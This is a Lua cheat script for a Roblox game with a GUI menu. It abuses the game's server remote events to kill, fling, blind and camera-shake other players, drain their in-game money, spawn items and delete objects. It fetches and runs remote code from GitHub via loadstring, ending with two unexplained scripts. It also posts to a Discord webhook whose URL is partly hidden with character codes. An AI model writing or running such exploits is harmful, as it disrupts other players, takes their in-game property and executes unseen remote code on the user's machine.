--[[



please don’t claim authorship of this script.



]]--








local Main = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()
-- Services and Variables
local localPlayer: Player = game:GetService("Players").LocalPlayer
local npc = workspace:WaitForChild("Characters")
local Remote: RemoteEvent = game:GetService("ReplicatedStorage"):WaitForChild("ALLREMBINDS"):WaitForChild("MainRemoteEvent")
local Remote2: RemoteFunction = game:GetService("ReplicatedStorage"):WaitForChild("ALLREMBINDS"):WaitForChild("MainRemoteFunction")
local fruits = localPlayer.PlayerStats.Tools
local chest = workspace.World.Chests
local HttpService = game:GetService("HttpService")

local tool = Instance.new("Tool")
tool.Name = "CLICK TO DELETE"
tool.RequiresHandle = false

tool.Activated:Connect(function()
    local mouse = localPlayer:GetMouse()
    local target = mouse.Target

    if target and target:IsA("BasePart") then
        local existingSelectionBox = target:FindFirstChild("SelectionBox")

        if existingSelectionBox then
            existingSelectionBox:Destroy()
        else
            local selectionBox = Instance.new("SelectionBox")
            selectionBox.Name = "SelectionBox"
            selectionBox.Adornee = target
            selectionBox.Parent = target
            Remote:FireServer("EMMFOSS__!ZCNSJNXCSDWQSANBX", "ChangeProptyOfSmtHSH", {target, "Parent", localPlayer.Character})
            localPlayer.Character.Humanoid.Health = 0
        end
    end
end)

local flingpower: number = 1000
local dmg: number = 100
local aurascale: number = 1

local animationNames: {string} = {}
local fruitsName: {string} = {}

for _, anim in ipairs(game:GetService("ReplicatedStorage").AllAnims.PreLoad.Dafult:GetChildren()) do
    if anim:IsA("Animation") then
        table.insert(animationNames, anim.Name)
    end
end

for _, fruit in ipairs(fruits:GetChildren()) do
    table.insert(fruitsName, fruit.Name)
end

local Window = Main:CreateWindow({
    Title = "solynot " .. 1.4,
    SubTitle = "by SolyNot",
    TabWidth = 160,
    Size = UDim2.fromOffset(580, 460),
    Acrylic = true,
    Theme = "Dark"
})

local Tabs: {string: Tab} = {
	Main = Window:AddTab({ Title = "Main", Icon = "box" }),
	OP = Window:AddTab({ Title = "OP", Icon = "skull" }),
    vision = Window:AddTab({ Title = "Vision", Icon = "eye" }),
    money = Window:AddTab({ Title = "Money", Icon = "banknote" }),
	Fruits = Window:AddTab({ Title = "Fruits", Icon = "apple" }),
	Aura = Window:AddTab({ Title = "Aura", Icon = "star" }),
	Animation = Window:AddTab({ Title = "Animation", Icon = "play" }),
	Chests = Window:AddTab({ Title = "Chests", Icon = "lock" }),
	Settings = Window:AddTab({ Title = "Settings", Icon = "settings" }),
	bug = Window:AddTab({ Title = "BUG/SUGGEST", Icon = "settings" }),
}
Window:SelectTab(1)

Tabs.Main:AddParagraph({
	Title = "Credit",
	Content = "Made by solynot"
})
Tabs.Main:AddParagraph({
	Title = "Update Log",
	Content = "ADD MONEY TAB"
})
Tabs.Main:AddButton({
    Title = "CLICK TO JOIN OUR DISCORD",
    Description = "https://discord.gg/8pJCFW8cpG",
    Callback = function()
        setclipboard("https://discord.gg/8pJCFW8cpG")
    end
})

-- OP Tab
Tabs.OP:AddButton({
    Title = "CLICK TO DESTROY(FE)",
    Description = "",
    Callback = function()
        tool.Parent = localPlayer.Character
    end
})
Tabs.OP:AddButton({
    Title = "KILL ALL PLAYERS/NPC",
    Description = "",
    Callback = function()
        for _, character in pairs(npc:GetChildren()) do
            if character:IsA("Model") and character:FindFirstChild("Humanoid") and character.Name ~= localPlayer.Name then
                Remote:FireServer("EMMFOSS__!ZCNSJNXCSDWQSANBX","Main_DamgeR___",{character, {Using = "Combat", Damge = 999999, FromPlayer = localPlayer}})
            end
        end
    end
})
Tabs.OP:AddInput("Input", {
	Title = "DAMAGE",
	Default = tostring(dmg),
	Numeric = true,
	Callback = function(Value: string)
		dmg = tonumber(Value) or dmg
	end
})
Tabs.OP:AddButton({
    Title = "DAMAGE ALL PLAYERS/NPC",
    Description = "",
    Callback = function()
        for _, character in pairs(npc:GetChildren()) do
            if character:IsA("Model") and character:FindFirstChild("Humanoid") and character.Name ~= localPlayer.Name then
                Remote:FireServer("EMMFOSS__!ZCNSJNXCSDWQSANBX", "Main_DamgeR___", { character, { Using = "Combat", Damge = dmg, FromPlayer = localPlayer } })
            end
        end
    end
})
Tabs.OP:AddInput("Input", {
	Title = "FLING POWER",
	Default = tostring(flingpower),
	Numeric = true,
	Callback = function(Value: string)
		flingpower = tonumber(Value) or flingpower 
	end
})
Tabs.OP:AddButton({
    Title = "FLING ALL PLAYERS/NPC",
    Description = "",
    Callback = function()
        for _, character in pairs(npc:GetChildren()) do
            if character:IsA("Model") and character:FindFirstChild("Humanoid") and character.Name ~= localPlayer.Name then
                Remote:FireServer("EMMFOSS__!ZCNSJNXCSDWQSANBX", "ASeemblyLinearVEllChangerr", { character:FindFirstChild("HumanoidRootPart"), Vector3.new(0, flingpower, 0) })
            end
        end
    end
})
--vision tab
Tabs.vision:AddButton({
	Title = "BLIND ALL",
	Callback = function()
		Remote:FireServer("EMMFOSS__!ZCNSJNXCSDWQSANBX", "Add_LiGthing_Effects_FromDistance", {Vector3.new(0, 0, 0), 99999999999999999, {ColorCorrection = {THeTWeeenFor_MakeTween__ = {{1}, {TintColor = Color3.new(0, 0, 0)}}, StartingTintColor = Color3.new(0, 0, 0)}}})
	end
})
Tabs.vision:AddButton({
	Title = "TRULY BLIND ALL",
	Callback = function()
		for _, character in pairs(npc:GetChildren()) do
			if character:IsA("Model") and character:FindFirstChild("Humanoid") and character.Name ~= localPlayer.Name then
				Remote:FireServer("EMMFOSS__!ZCNSJNXCSDWQSANBX", "ByNetworkOwnerMethodExecuteMainModuleFunctionsOnClient_Server_SideS", {"kemothebest9097?______SDSDSDSCXZVCLOPXZ12", character:WaitForChild("HumanoidRootPart"), "ChangeProptyOfSmtHSH", {{{character:WaitForChild("HumanoidRootPart"), "Responsiveness", 500, {["CHanGeProptYAfterTime"] = {0, 9999999999999999}}}, {character:WaitForChild("HumanoidRootPart"), "Position", Vector3.new(0, 1e15, 0), {["CHanGeProptYAfterTime"] = {0, Vector3.new(0, 1e15, 0)}}}}}})
			end
		end
	end
})
Tabs.vision:AddButton({
	Title = "red sky",
	Callback = function()
		Remote:FireServer("EMMFOSS__!ZCNSJNXCSDWQSANBX", "Add_LiGthing_Effects_FromDistance", {Vector3.new(0, 0, 0), 99999999999999999, {ColorCorrection = {THeTWeeenFor_MakeTween__ = {{1}, {TintColor = Color3.new(1, 0, 0)}}, StartingTintColor = Color3.new(1, 0, 0)}}})
	end
})
Tabs.vision:AddButton({
	Title = "white sky",
	Callback = function()
		Remote:FireServer("EMMFOSS__!ZCNSJNXCSDWQSANBX", "Add_LiGthing_Effects_FromDistance", {Vector3.new(0, 0, 0), 99999999999999999, {ColorCorrection = {THeTWeeenFor_MakeTween__ = {{1}, {TintColor = Color3.new(1, 1, 1)}}, StartingTintColor = Color3.new(1, 1, 1)}}})
	end
})
Tabs.vision:AddButton({
	Title = "SHAKE ALL PLAYERS CAMERA",
	Callback = function()
		Remote:FireServer("EMMFOSS__!ZCNSJNXCSDWQSANBX", "ShAkeCamFromDiStanceee", {Vector3.new(0, 0, 0), 9999999999999999, {ShakeOnce = true, Propties = {4, 5, 0.1, 0.6, Vector3.new(10, 10, 10), Vector3.new(999, 999, 999)}}})
	end
})
Tabs.vision:AddButton({
	Title = "SUPER SHAKE ALL PLAYERS CAMERA",
	Callback = function()
		Remote:FireServer("EMMFOSS__!ZCNSJNXCSDWQSANBX", "ShAkeCamFromDiStanceee", {Vector3.new(0, 0, 0), 9999999999999999, {ShakeOnce = true, Propties = {9999999999, 999999, 5, 555, Vector3.new(10, 999999999, 10), Vector3.new(999, 999, 999)}}})
	end
})
Tabs.vision:AddButton({
	Title = "EARTHQUAKE",
	Callback = function()
		Remote:FireServer("EMMFOSS__!ZCNSJNXCSDWQSANBX", "ShAkeCamFromDiStanceee", {Vector3.new(0, 0, 0), 9999999999999999, {ShakeOnce = true, Propties = {5, 5, 5, 5, Vector3.new(5, 5, 5), Vector3.new(5, 5, 5)}}})
	end
})
--money tab
Tabs.money:AddButton({
    Title = "Steal Players Money",
    Description = "",
    Callback = function()
        for _, v in pairs(game:GetService("Players"):GetPlayers()) do
            if v.Name ~= localPlayer.Name then
                Remote2:InvokeServer("EMMFOSS__!ZCNSJNXCSDWQSANBX", "IsHaveAmountOfMoney", {v, nil, true, "FlashStepCost", '<font color="#FF0000">T</font><font color="#FF7F00">h</font><font color="#FFFF00">e</font> <font color="#00FF00">S</font><font color="#0000FF">o</font><font color="#4B0082">l</font><font color="#8B00FF">y</font><font color="#FF0000">n</font><font color="#FF7F00">o</font><font color="#FFFF00">t</font> <font color="#00FF00">W</font><font color="#0000FF">i</font><font color="#4B0082">l</font><font color="#8B00FF">l</font> <font color="#FF0000">T</font><font color="#FF7F00">a</font><font color="#FFFF00">k</font><font color="#00FF00">e</font> <font color="#0000FF">Y</font><font color="#4B0082">o</font><font color="#8B00FF">u</font><font color="#FF0000">r</font> <font color="#FF7F00">M</font><font color="#FFFF00">o</font><font color="#00FF00">n</font><font color="#0000FF">e</font><font color="#4B0082">y</font>'})
                Remote2:InvokeServer("EMMFOSS__!ZCNSJNXCSDWQSANBX", "IsHaveAmountOfMoney", {v, nil, true, "AuraCost", '<font color="#FF0000">T</font><font color="#FF7F00">h</font><font color="#FFFF00">e</font> <font color="#00FF00">S</font><font color="#0000FF">o</font><font color="#4B0082">l</font><font color="#8B00FF">y</font><font color="#FF0000">n</font><font color="#FF7F00">o</font><font color="#FFFF00">t</font> <font color="#00FF00">W</font><font color="#0000FF">i</font><font color="#4B0082">l</font><font color="#8B00FF">l</font> <font color="#FF0000">T</font><font color="#FF7F00">a</font><font color="#FFFF00">k</font><font color="#00FF00">e</font> <font color="#0000FF">Y</font><font color="#4B0082">o</font><font color="#8B00FF">u</font><font color="#FF0000">r</font> <font color="#FF7F00">M</font><font color="#FFFF00">o</font><font color="#00FF00">n</font><font color="#0000FF">e</font><font color="#4B0082">y</font>'})
                Remote2:InvokeServer("EMMFOSS__!ZCNSJNXCSDWQSANBX", "IsHaveAmountOfMoney", {v, nil, true, "AirJumpCost", '<font color="#FF0000">T</font><font color="#FF7F00">h</font><font color="#FFFF00">e</font> <font color="#00FF00">S</font><font color="#0000FF">o</font><font color="#4B0082">l</font><font color="#8B00FF">y</font><font color="#FF0000">n</font><font color="#FF7F00">o</font><font color="#FFFF00">t</font> <font color="#00FF00">W</font><font color="#0000FF">i</font><font color="#4B0082">l</font><font color="#8B00FF">l</font> <font color="#FF0000">T</font><font color="#FF7F00">a</font><font color="#FFFF00">k</font><font color="#00FF00">e</font> <font color="#0000FF">Y</font><font color="#4B0082">o</font><font color="#8B00FF">u</font><font color="#FF0000">r</font> <font color="#FF7F00">M</font><font color="#FFFF00">o</font><font color="#00FF00">n</font><font color="#0000FF">e</font><font color="#4B0082">y</font>'})
            end
        end
    end
})
Tabs.money:AddButton({
    Title = "print players money",
    Description = "",
    Callback = function()
        for _, plr in pairs(game:GetService("Players"):GetPlayers()) do
            if plr ~= localPlayer then
                print(plr, plr.PlayerStats.Money.Value)
            end
        end
    end
})
-- Fruits Tab
local FruitDropDown: DropdownMenuItem<Dropdown>
FruitDropDown = Tabs.Fruits:AddDropdown("Dropdown", {
	Title="FRUITS",
	Values=fruitsName,
	Multi=false,
	Default=1,
})
Tabs.Fruits:AddButton({
    Title = "GET FRUIT",
    Description = "",
    Callback = function()
        Remote:FireServer("EMMFOSS__!ZCNSJNXCSDWQSANBX", "AddToolToBackpackKKK", { FruitDropDown.Value .. " Fruit", localPlayer:WaitForChild("Backpack"), true, true })
    end
})
Tabs.Fruits:AddButton({
    Title = "GET ALL FRUITS",
    Description = "",
    Callback = function()
        for _, fruit in ipairs(fruits:GetChildren()) do
            Remote:FireServer("EMMFOSS__!ZCNSJNXCSDWQSANBX", "AddToolToBackpackKKK", { fruit.Name .. " Fruit", localPlayer:WaitForChild("Backpack"), true, true })
        end
    end
})
Tabs.Fruits:AddButton({
    Title = "INF MASTERY FOR EVERYTHING",
    Description = "",
    Callback = function()
        for _, fruit in ipairs(fruits:GetChildren()) do
            Remote:FireServer("EMMFOSS__!ZCNSJNXCSDWQSANBX", "GiveMasteryEXPTO__Smthh", { localPlayer, fruit.Name, 99999999, true })
        end
    end
})

-- Aura Tab
local AuraDropdown: DropdownMenuItem<Dropdown>

AuraDropdown = Tabs.Aura:AddDropdown("Dropdown", {
	Title="AURA",
	Values={"DashF", "Dragon_WingV2", "WindAuraModel"},
	Multi=false,
	Default=1,
})

Tabs.Aura:AddInput("Input", {
	Title="AURA SCALE",
	Default=tostring(aurascale),
	Numeric=true,
	Callback=function(Value:string)
		aurascale=tonumber(Value) or aurascale
	end,
})
Tabs.Aura:AddButton({
    Title = "GET AURA ALL PLAYERS/NPC",
    Description = "",
    Callback = function()
        for _, character in pairs(npc:GetChildren()) do
            if character:IsA("Model") and character:FindFirstChild("Humanoid") and character.Name ~= localPlayer.Name then
                Remote:FireServer("EMMFOSS__!ZCNSJNXCSDWQSANBX", "ADDDAndWElddTOSomePart", {[1] = {DEStroyANyTHingWAsSameeName = "",PArtToWeldTO = character.HumanoidRootPart,OBJ = game.ReplicatedStorage.VFX.FruitsSSSSS.Dragon.F:FindFirstChild(AuraDropdown.Value),ScalLEMOdelTO = aurascale,PArentOFOBJJJ = character,}})
            end
        end
    end
})
Tabs.Aura:AddButton({
    Title = "GET AURA FOR MYSELF",
    Description = "",
    Callback = function()
        Remote:FireServer("EMMFOSS__!ZCNSJNXCSDWQSANBX", "ADDDAndWElddTOSomePart", {[1] = {DEStroyANyTHingWAsSameeName = "",PArtToWeldTO = localPlayer.Character.HumanoidRootPart,OBJ = game.ReplicatedStorage.VFX.FruitsSSSSS.Dragon.F:FindFirstChild(AuraDropdown.Value),ScalLEMOdelTO = aurascale,PArentOFOBJJJ = localPlayer.Character,}})
    end
})

-- Chests Tab
Tabs.Chests:AddButton({
    Title = "COLLECT ALL CHESTS",
    Description = "",
    Callback = function()
        for _, chest in ipairs(chest:GetChildren()) do
            firetouchinterest(localPlayer.Character.HumanoidRootPart, chest, 0)
            firetouchinterest(localPlayer.Character.HumanoidRootPart, chest, 1)
        end
    end
})
--animation tabs
local AnimationDropDown: DropdownMenuItem<Dropdown>
AnimationDropDown = Tabs.Animation:AddDropdown("Dropdown", {
	Title="ANIMATION",
	Values=animationNames,
	Multi=false,
	Default=1,
})
Tabs.Animation:AddButton({
	Title = "PLAY ANIMATION ALL PLAYERS/NPC",
	Callback = function()
		for _, character in pairs(npc:GetChildren()) do
			if character:IsA("Model") and character:FindFirstChild("Humanoid") and character.Name ~= localPlayer.Name then
				Remote:FireServer("EMMFOSS__!ZCNSJNXCSDWQSANBX", "AddANimSSOnDeathh", {character, AnimationDropDown.Value, 99999})
			end
		end
	end
})
Tabs.Animation:AddButton({
	Title = "PLAY ANIMATION FOR MYSELF",
	Callback = function()
		Remote:FireServer("EMMFOSS__!ZCNSJNXCSDWQSANBX", "AddANimSSOnDeathh", {localPlayer.Character, AnimationDropDown.Value, 99999})
	end
})
--bug tabs
local function sendWebhookMessage(message)
    local embed = {
        title = "BUG/SUGGEST",
        description = "SENT BY: " .. localPlayer.Name .. "\nMESSAGE: " .. message,
        color = 0x3498db
    }

    http_request({
        Url = string.char(104, 116, 116, 112, 115) .. "://disc" .. "ordapp.com" .. "/api/webhooks/" .. "1327296629719568425" .. "/" .. string.char(52, 87, 99, 84, 103, 105, 81, 97, 120, 111, 73, 83, 84, 108, 84, 97, 102, 120) .. "GVwSabG5eM3JuwfkJluyROxYHIbhTvBtQfiglbcIkzhpb8O1EA",
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode({
            embeds = {embed}
        })
    })
end
Tabs.bug:AddParagraph({
	Title = "BUG/SUGGEST",
	Content = "BUG REPORT or SUGGEST"
})
Tabs.bug:AddInput("Input", {
	Title = "BUG/SUGGEST",
	Default = "",
	Numeric = false,
	Finished = true,
	Callback = function(Value: string)
		sendWebhookMessage(Value)
	end
})
Main:Notify({
    Title = "@SolyNot",
    Content = "thanks for using my script",
    Duration = 8
})
SaveManager:SetLibrary(Main)
InterfaceManager:SetLibrary(Main)
InterfaceManager:BuildInterfaceSection(Tabs.Settings)
SaveManager:BuildConfigSection(Tabs.Settings)
loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconBABA/script/refs/heads/main/web.lua"))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconBABA/script/refs/heads/main/command.lua"))()
